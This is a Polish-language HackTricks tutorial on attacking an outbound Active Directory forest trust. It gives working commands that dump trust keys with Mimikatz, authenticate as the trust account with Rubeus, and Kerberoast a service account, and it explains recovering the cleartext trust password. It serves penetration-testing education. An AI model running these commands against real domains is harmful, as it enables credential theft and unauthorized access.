# Zewnętrzna domena lasu - Jednokierunkowe (wychodzące)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>

W tym scenariuszu **twoja domena** udziela pewnych **uprawnień** podmiotowi z **różnych domen**.

## Eksploracja

### Zaufanie wychodzące
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Atak na konto zaufania

Istnieje podatność na atak, gdy relacja zaufania jest ustanowiona między dwoma domenami, zidentyfikowanymi tutaj jako domena **A** i domena **B**, gdzie domena **B** rozszerza swoje zaufanie do domeny **A**. W tej konfiguracji specjalne konto jest tworzone w domenie **A** dla domeny **B**, które odgrywa kluczową rolę w procesie uwierzytelniania między dwiema domenami. To konto, powiązane z domeną **B**, jest wykorzystywane do szyfrowania biletów umożliwiających dostęp do usług między domenami.

Kluczowym aspektem do zrozumienia tutaj jest to, że hasło i skrót tego specjalnego konta mogą być wyodrębnione z kontrolera domeny w domenie **A** za pomocą narzędzia wiersza poleceń. Polecenie do wykonania tej czynności to:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
To wydobycie jest możliwe, ponieważ konto, zidentyfikowane za pomocą **$** po swojej nazwie, jest aktywne i należy do grupy "Domain Users" domeny **A**, co oznacza dziedziczenie uprawnień związanych z tą grupą. Pozwala to osobom uwierzytelniać się w domenie **A** przy użyciu poświadczeń tego konta.

**Ostrzeżenie:** Wykorzystanie tej sytuacji w celu uzyskania punktu zaczepienia w domenie **A** jako użytkownik, choć z ograniczonymi uprawnieniami, jest możliwe. Jednak ten dostęp wystarcza do przeprowadzenia enumeracji w domenie **A**.

W scenariuszu, gdzie `ext.local` jest domeną ufającą, a `root.local` jest domeną zaufaną, konto użytkownika o nazwie `EXT$` zostanie utworzone w `root.local`. Za pomocą konkretnych narzędzi możliwe jest wydumpowanie kluczy zaufania Kerberos, ujawniając poświadczenia `EXT$` w `root.local`. Polecenie do osiągnięcia tego to:
```bash
lsadump::trust /patch
```
Następnie można użyć wyodrębnionego klucza RC4 do uwierzytelnienia jako `root.local\EXT$` w `root.local` za pomocą innego polecenia narzędzia:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
To uwierzytelnienie otwiera możliwość wyliczenia, a nawet wykorzystania usług w `root.local`, takich jak przeprowadzenie ataku Kerberoast w celu wydobycia poświadczeń konta usługi za pomocą:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Pozyskiwanie hasła zaufania w tekście jawnym

W poprzednim przepływie użyto hasha zaufania zamiast **hasła w tekście jawnym** (które również zostało **wydobyte przez mimikatz**).

Hasło w tekście jawnym można uzyskać, konwertując wynik \[ CLEAR ] z mimikatz z szesnastkowego i usuwając bajty null ' \x00 ':

![](<../../.gitbook/assets/image (938).png>)

Czasami podczas tworzenia relacji zaufania, użytkownik musi wpisać hasło dla zaufania. W tej demonstracji kluczem jest oryginalne hasło zaufania i dlatego jest czytelne dla ludzi. Ponieważ klucz cykluje (co 30 dni), hasło w tekście jawnym nie będzie czytelne dla ludzi, ale technicznie nadal użyteczne.

Hasło w tekście jawnym można użyć do wykonywania regularnej autoryzacji jako konto zaufania, jako alternatywa dla żądania TGT za pomocą tajnego klucza Kerberosa konta zaufania. Tutaj, zapytanie o root.local z ext.local dla członków Administratorów domeny:

![](<../../.gitbook/assets/image (792).png>)

## Referencje

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
